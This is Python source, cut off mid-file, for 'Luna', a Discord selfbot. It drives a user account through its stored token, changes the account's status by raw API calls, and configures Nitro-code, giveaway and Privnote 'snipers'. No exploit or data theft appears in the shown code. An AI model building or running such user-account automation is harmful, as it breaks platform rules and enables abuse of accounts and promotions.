import asyncio
import discord
import ctypes.wintypes as wintypes
import json
import os
import sys
import urllib
import ctypes
import random
import time
import playsound
import requests
import re
import string
import socket
import aiohttp
import typing
import pyPrivnote
from CEA256 import *
import httpx
import dhooks
import base64
import hashlib
import qrcode
import pwinput
from discord.embeds import Embed
from discord.ext import commands
from gtts import gTTS
from ctypes import windll
from datetime import datetime
from os import system
from AuthGG.client import Client as luna_gg
from discord import *
from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
from notifypy import Notify

# ///////////////////////////////////////////////////////////////
# Window

system("mode con: " + f"cols=102 lines=35")

STDOUT = -11

hdl = windll.kernel32.GetStdHandle(STDOUT)
bufsize = wintypes._COORD(102, 9001)
windll.kernel32.SetConsoleScreenBufferSize(hdl, bufsize)

os.system("")

# toaster = ToastNotifier()

# ///////////////////////////////////////////////////////////////
# Colors

class gradient:
    logo1 = "\033[38;2;110;0;255m"
    logo2 = "\033[38;2;95;0;255m"
    logo3 = "\033[38;2;80;0;255m"
    logo4 = "\033[38;2;65;0;255m"
    logo5 = "\033[38;2;50;0;255m"
    logo6 = "\033[38;2;35;0;255m"
    reset = "\033[0m"

class bcolors:
	YELLOW = '\033[33m'
	RED = '\033[31m'
	GREEN = '\033[32m'
	CYAN = '\033[36m'
	MAGENTA = '\033[35m'

	LIGHTCYAN = '\033[96m'
	LIGHTMAGENTA = '\033[95m'
	LIGHTRED = '\033[91m'
	LIGHTGREY = '\033[37m'

	DARKGRAY = '\033[90m'
	RESET = '\033[0m'

	EVENT = '\033[94m'
	INFO = '\033[96m'
	COMMAND = '\033[95m'
	ERROR = '\033[38;2;225;9;89m'
	SNIPERLOG = '\033[35m'
	INPUT = '\033[95m'
	MESSAGE = '\033[36m'

	COMMANDVAR = '\033[95m'

	LOGOCOLOR1 = '\033[94m'
	LOGOCOLOR2 = '\033[95m'

def purpleblue(text):
	os.system(""); faded = ""
	red = 220
	green = 0
	blue = 255
	for line in text.splitlines():
		faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
		if not red == 0:
			red -= 25
			if red < 0:
				red = 0
		if not green == 0:
			green -= 40
			if green < 0:
				green = 0
	return faded

def purplecyan(text):
	os.system(""); faded = ""
	red = 0
	green = 255
	blue = 255
	for line in text.splitlines():
		faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
		if not red == 255:
			red += 22
			if red < 0:
				red = 0
		if not green == 0:
			green -= 40
			if green < 0:
				green = 0
	return faded

def purple(text):
    os.system(""); faded = ""; down = False
    for line in text.splitlines():
        red = 40
        for character in line:
            if down:
                red -= 3
            else:
                red += 3
            if red > 254:
                red = 255
                down = True
            elif red < 1:
                red = 30
                down = False
            faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
    return faded

# ///////////////////////////////////////////////////////////////
# Prints

Event = " Event "  # 94 Blue
Info = " Info "  # 96 Blue
Command = "Command"  # 95 Magenta
Error = " Error "  # 31 Red
SniperLog = "Sniper"  # 35 Magenta
Input = " Input "  # 95 Magenta
Message = "Message"  # 36 Blue
Shared = "Sharing"  # 95 Magenta
SelfbotLog = "Selfbot" # 35 Magenta

# ///////////////////////////////////////////////////////////////
# Luna Variables

lunaversion = '2.1.1'
cooldown = []
whitelisted_users = {}
afkstatus = 0
afk_user_id = 0
afk_reset = 0
crosshairmode = 0
antiraid = False
privacy = False
copycat = None
chargesniper = False

# ///////////////////////////////////////////////////////////////
# Pastebin

updateurldec = urllib.request.urlopen('https://pastebin.com/raw/mt9DERP6')
for line in updateurldec:
	updateurl = line.decode().strip()

motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ')
for line in motd:
	motd = line.decode().strip()

def createFolder(directory):
	try:
		if not os.path.exists(directory):
			os.makedirs(directory)
	except OSError:
		print('Error: Creating directory. ' + directory)

# ///////////////////////////////////////////////////////////////
# Def

def charge():
	with open("config.json") as f:
		config = json.load(f)
	token = config.get('token')
	startup_status = config.get('startup_status')
	if startup_status == "dnd":
		status = "dnd"
	elif startup_status == "idle":
		status = "idle"
	else:
		status = "online"
	request = requests.Session()
	headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [#####]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)

def chargesniped():
	with open("config.json") as f:
		config = json.load(f)
	token = config.get('token')
	startup_status = config.get('startup_status')
	if startup_status == "dnd":
		status = "dnd"
	elif startup_status == "idle":
		status = "idle"
	else:
		status = "online"
	request = requests.Session()
	headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [     ]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
	time.sleep(2.9)
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [#    ]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
	time.sleep(2.9)
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [##   ]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
	time.sleep(2.9)
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [###  ]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
	time.sleep(2.9)
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [#### ]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
	time.sleep(2.9)
	setting = {
        'status': f"{status}",
        "custom_status": {"text": "Charge [#####]"}
    }
	request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)

# ///////////////////////////////////////////////////////////////

def file_exist(file_name):
	return os.path.exists(file_name)


def createFolder(directory):
	try:
		if not os.path.exists(directory):
			os.makedirs(directory)
	except OSError:
		print('Error: Creating directory. ' + directory)


def title(text):
	if sys.platform == "win32":
		Title = ctypes.windll.kernel32.SetConsoleTitleW(f"{text}")
	else:
		Title = sys.stdout.write(f"\x1b]2;{text}\x07")
	return Title


def clear():
	return os.system('cls' if os.name == 'nt' else 'clear')


def get_config():
	with open("config.json") as f:
		config = json.load(f)
	return config

# .center(os.get_terminal_size().columns)
#                                _|

def Logo():
	return (
		print(),
		print(f"                        *                                 +       .-.,=`````=.  +"),
		print(f"                 O         _|            .                         `=/_       \                o"),
		print(f" .                         _|        _|    _|  _|_|_|      _|_|_|   |  `=._    |       ."),
		print(f"            +              _|        _|    _|  _|    _|  _|    _|  . \     `=./`, "),
		print(f"                           _|        _|    _|  _|    _|  _|    _|     `=.__.=` `=`"),
		print(f"    *                +     _|_|_|_|    _|_|_|  _|    _|    _|_|_|            *    "),
		print(f"                           .                      o                                       +"),
		print()
	)

logo = f"""
       .                                         o                                    *
                        *                                 +       .-.,=`````=.  +
                 O         _|            .                         `=/_       \                o
 .                         _|        _|    _|  _|_|_|      _|_|_|   |  `=._    |       .
            +              _|        _|    _|  _|    _|  _|    _|  . \     `=./`, 
                           _|        _|    _|  _|    _|  _|    _|     `=.__.=` `=`
    *                +     _|_|_|_|    _|_|_|  _|    _|    _|_|_|            *    
                           .                      o                                       +
"""

def Randprntsc():
		letterprn = ''.join(random.choices(string.ascii_lowercase, k=4))
		numberprn = random.randint(10, 99)
		return f'https://prnt.sc/{numberprn}{letterprn}'

# ///////////////////////////////////////////////////////////////
# get_prefix

def get_prefix(bot, message):
	with open("config.json", "r") as f:
		config = json.load(f)
	prefix = config.get('prefix')
	return prefix


# ///////////////////////////////////////////////////////////////
# Print System

def printcommand(commandname):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	with open("config.json", "r") as f:
		config = json.load(f)
	prefix = config.get('prefix')
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{Command}')} | {prefix}{commandname}")


def printerror(errorname):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	return print(f"{purple(f'{timestampStr}')} | {bcolors.ERROR}{Error}{bcolors.RESET} | {errorname}")


def printmessage(messagename):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{Message}')} | {messagename}")


def printsniper(snipername):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{SniperLog}')}  | {snipername}")


def printsharedcommand(commandname):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	with open("config.json", "r") as f:
		config = json.load(f)
	prefix = config.get('prefix')
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{Shared}')} | {prefix}{commandname}")


def printinput(inputname):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{Input}')} | {inputname}")


def printevent(eventname):
	datetime.now(tz=None)
	dateTimeObj = datetime.now()
	timestampStr = dateTimeObj.strftime("%H:%M")
	return print(f"{purple(f'{timestampStr}')} | {purple(f'{Event}')} | {eventname}")


# ///////////////////////////////////////////////////////////////
# Loading main screen

clear()
print(purpleblue(logo))
printevent("Loading Data...")

# ///////////////////////////////////////////////////////////////
# Get config.json

# Bot declaration
class Greetings(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self._last_member = None

if file_exist('config.json'):
	with open("config.json", "r") as f:
		config = json.load(f)
	token = config.get('token')
	prefix = config.get('prefix')
	startup_status = config.get('startup_status')
	if startup_status == "dnd":
		statuscon = Status.dnd
	elif startup_status == "idle":
		statuscon = Status.idle
	elif startup_status == "invisible" or startup_status == "offline":
		statuscon = Status.offline
	else:
		statuscon = Status.online

	# The bot
	bot = commands.Bot(get_prefix, self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off(), status=statuscon)
else:
	bot = commands.Bot(".", self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off(), status=Status.online)

# ///////////////////////////////////////////////////////////////
# Themes Defs

def create_theme_because_missing():
	createFolder('./data/themes')
	data = {
		"title": "Luna",
		"titleurl": "",
		"footer": "Team Luna",
		"footer_iconurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
		"imageurl": "https://cdn.discordapp.com/attachments/878593887113986048/879063329459544074/Luna3.png",
		"large_imageurl": "",
		"hexcolor": "#2f3553",
		"author": "",
		"author_iconurl": "",
		"authorurl": "",
		"description": True
	}
	with open("data/themes/luna.json", "w") as f:
		f.write(json.dumps(data, indent=4))
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	password = config.get('password')
	prefix = config.get('prefix')
	streamurl = config.get('streamurl')
	afkmessage = config.get('afkmessage')
	deletetimer = int(config.get('deletetimer'))
	mode = int(config.get('mode'))
	errorlog = config.get('errorlog')
	riskmode = config.get('riskmode')
	startup_status = config.get('startup_status')
	data = {
		"token": f"{token}",
		"password": f"{password}",
		"prefix": f"{prefix}",
		"streamurl": f"{streamurl}",
		"afkmessage": f"{afkmessage}",
		"deletetimer": f"{deletetimer}",
		"mode": f"{mode}",
		"errorlog": f"{errorlog}",
		"riskmode": f"{riskmode}",
		"theme": "luna.json",
		"startup_status": f"{startup_status}"
	}
	with open("config.json", "w") as f:
		f.write(json.dumps(data, indent=4))

def titlevar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	try:
		with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
			customi = json.load(f)
	except:
		create_theme_because_missing()
	titlevar = customi.get('title')
	if titlevar == None:
		titlevar = ""
	return titlevar

def titleurlvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	titleurlvar = customi.get('titleurl')
	if titleurlvar == None:
		titleurlvar = ""
	return titleurlvar

def footervar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	footervar = customi.get('footer')
	if footervar == None:
		footervar = ""
	return footervar

def footer_iconurlvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	footer_iconurlvar = customi.get('footer_iconurl')
	if footer_iconurlvar == None:
		footer_iconurlvar = ""
	elif footer_iconurlvar == "$avatar":
		footer_iconurlvar = bot.user.avatar_url
	return footer_iconurlvar

def imagevar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	imagevar = customi.get('imageurl')
	if imagevar == None:
		imagevar = ""
	elif imagevar == "$avatar":
		imagevar = bot.user.avatar_url
	return imagevar

def largeimagevar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	largeimagevar = customi.get('large_imageurl')
	if largeimagevar == None:
		largeimagevar = ""
	elif largeimagevar == "$avatar":
		largeimagevar = bot.user.avatar_url
	return largeimagevar

def hexcolorvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		customi = json.load(f)
	hexcolorvar = customi.get('hexcolor')
	if hexcolorvar == None:
		hexcolorvar = "#000000"
	if hexcolorvar == "random":
		hexcolorvar = random.randint(0, 0xffffff)
	elif len(hexcolorvar) > 7:
		hexcolorvar = int(hexcolorvar)
	else:
		hexcolorvar = int(hexcolorvar.replace('#', ''), 16)
	return hexcolorvar

def authorvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	authorvar = customi.get('author')
	if authorvar == None:
		authorvar = ""
	return authorvar

def author_iconurlvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	author_iconurlvar = customi.get('author_iconurl')
	if author_iconurlvar == None:
		author_iconurlvar = ""
	elif author_iconurlvar == "$avatar":
		author_iconurlvar = bot.user.avatar_url
	return author_iconurlvar

def authorurlvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	authorurlvar = customi.get('authorurl')
	if authorurlvar == None:
		authorurlvar = ""
	return authorurlvar

def descriptionvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	mode = int(config.get('mode'))
	with open(f"data/themes/{themesvar}", encoding='utf-8') as f:
		customi = json.load(f)
	descriptionvar = customi.get('description')
	if descriptionvar == None:
		descriptionvar = True
	if descriptionvar:
		descriptionvar = "```<> is required | [] is optional\n\n```"
	elif not descriptionvar:
		descriptionvar = ""
	return descriptionvar

# ///////////////////////////////////////////////////////////////
# Def file dump system (Themes)

def config_theme_title(newtitle):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{newtitle}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_titleurl(newtitleurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{newtitleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_footer(newfooter):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{newfooter}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_footer_iconurl(newfooter_iconurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{newfooter_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_imageurl(newimageurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{newimageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_largeimageurl(newlarge_imageurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{newlarge_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_hexcolor(newhexcolor):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{newhexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_author(newauthor):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{newauthor}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_author_iconurl(newauthor_iconurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	authorurl = theme.get('authorurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{newauthor_iconurl}",
		"authorurl": f"{authorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_authorurl(newauthorurl):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	description = theme.get('description')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{newauthorurl}",
		"description": description
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_theme_description(newdescription):
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	with open(f"data/themes/{themesvar}") as f:
		theme = json.load(f)
	title = theme.get('title')
	titleurl = theme.get('titleurl')
	footer = theme.get('footer')
	footer_iconurl = theme.get('footer_iconurl')
	imageurl = theme.get('imageurl')
	large_imageurl = theme.get('large_imageurl')
	hexcolor = theme.get('hexcolor')
	author = theme.get('author')
	author_iconurl = theme.get('author_iconurl')
	authorurl = theme.get('authorurl')
	data = {
		"title": f"{title}",
		"titleurl": f"{titleurl}",
		"footer": f"{footer}",
		"footer_iconurl": f"{footer_iconurl}",
		"imageurl": f"{imageurl}",
		"large_imageurl": f"{large_imageurl}",
		"hexcolor": f"{hexcolor}",
		"author": f"{author}",
		"author_iconurl": f"{author_iconurl}",
		"authorurl": f"{authorurl}",
		"description": newdescription
	}
	with open(f"data/themes/{themesvar}", "w") as f:
		f.write(json.dumps(data, indent=4))


# ///////////////////////////////////////////////////////////////
# Config Defs

def mode():
	with open('./config.json') as f:
		config = json.load(f)
	mode = int(config.get('mode'))
	return mode


def deletetimer():
	with open('./config.json') as f:
		config = json.load(f)
	deletetimer = int(config.get('deletetimer'))
	return deletetimer


def themesvar():
	with open('./config.json') as f:
		config = json.load(f)
	themesvar = config.get('theme')
	return themesvar


def riskmode():
	with open('./config.json') as f:
		config = json.load(f)
	riskmode = config.get('riskmode')
	return riskmode


def errorlog():
	with open('./config.json') as f:
		config = json.load(f)
	errorlog = config.get('errorlog')
	return errorlog


def afkmessage():
	with open('./config.json') as f:
		config = json.load(f)
	afkmessage = config.get('afkmessage')
	return afkmessage


def streamurl():
	with open('./config.json') as f:
		config = json.load(f)
	streamurl = config.get('streamurl')
	return streamurl


def password():
	with open('./config.json') as f:
		config = json.load(f)
	password = config.get('password')
	return password


def token():
	with open('./config.json') as f:
		config = json.load(f)
	token = config.get('token')
	return token


def prefix(bot):
	with open('./config.json') as f:
		config = json.load(f)
	prefix = config.get('prefix')
	return prefix


# ///////////////////////////////////////////////////////////////
# Sniper Defs

def nitro_sniper():
	with open('data/nitro.json') as f:
		nitrosn = json.load(f)
	nitro_sniper = nitrosn.get('nitrosniper')
	return nitro_sniper


def nitro_sniper_api():
	with open('data/nitro.json') as f:
		nitrosn = json.load(f)
	api = nitrosn.get('api')
	return api


def giveaway_sniper():
	with open('data/giveawayjoiner.json') as f:
		slot = json.load(f)
	giveaway_sniper = slot.get('giveawayjoiner')
	return giveaway_sniper


def delay_in_minutes():
	with open('data/giveawayjoiner.json') as f:
		slot = json.load(f)
	delay_in_minutes = slot.get('delay_in_minutes')
	return delay_in_minutes


def selfbot_detection():
	with open('data/selfbotdetection.json') as f:
		slot = json.load(f)
	selfbotdetection = slot.get('selfbotdetection')
	return selfbotdetection


def privnote_sniper():
	with open('data/privnote.json') as f:
		slot = json.load(f)
	privnote_sniper = slot.get('privnotesniper')
	return privnote_sniper


# ///////////////////////////////////////////////////////////////
# Config Sniper Defs

def config_nitro_sniper(newmode):
	with open('data/nitro.json') as f:
		data = json.load(f)
	api = data.get('api')
	data = {
		"nitrosniper": f"{newmode}",
		"api": f"{api}"
	}
	with open("data/nitro.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_nitro_sniperapi(newmode):
	with open('data/nitro.json') as f:
		data = json.load(f)
	nitrosniper = data.get('nitrosniper')
	data = {
		"nitrosniper": f"{nitrosniper}",
		"api": f"{newmode}"
	}
	with open("data/nitro.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_giveaway_sniper(newmode):
	with open('data/giveawayjoiner.json') as f:
		data = json.load(f)
	delay_in_minutes = int(data.get('delay_in_minutes'))
	giveaway_blocked_words = data.get('giveaway_blocked_words')
	giveaway_server_joiner = data.get('giveaway_server_joiner')
	data = {
		"giveawayjoiner": f"{newmode}",
		"delay_in_minutes": f"{delay_in_minutes}",
		"giveaway_blocked_words": f"{giveaway_blocked_words}",
		"giveaway_server_joiner": f"{giveaway_server_joiner}"
	}
	with open("data/giveawayjoiner.json", "w") as f:
		f.write(json.dumps(data, indent=4))


def config_giveaway_sniperdelay(newmode):
	with open('data/giveawayjoiner.json') as f:
		data = json.load(f)
	giveawayjoiner = data.get('giveawayjoiner')
	giveaway_blocked_words = data.get('giveaway_blocked_words')
	giveaway_server_joiner = data.get('giveaway_server_joiner')
	data = {
		"giveawayjoiner": f"{giveawayjoiner}",
